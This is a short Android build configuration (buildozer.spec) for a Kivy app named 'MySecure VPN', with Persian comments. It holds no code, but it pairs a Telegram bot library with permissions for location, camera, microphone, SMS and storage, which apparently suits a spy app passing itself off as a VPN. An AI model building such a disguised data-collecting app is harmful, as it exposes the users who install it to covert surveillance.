[app]
title = MySecure VPN
package.name = mysecurevpn
package.domain = org.example.vpn
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,svg

version = 1.0
requirements = python3,kivy,plyer,pyTelegramBotAPI,requests  # telebot رو pyTelegramBotAPI بنویس

[buildozer]
log_level = 2

android.permissions = INTERNET,ACCESS_FINE_LOCATION,CAMERA,RECORD_AUDIO,READ_SMS,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE

android.api = 33
android.minapi = 21
android.sdk = 33
android.ndk = 25b

android.icon.filename = %(source.dir)s/icon.png
android.presplash.filename = %(source.dir)s/splash.png  # اگر داری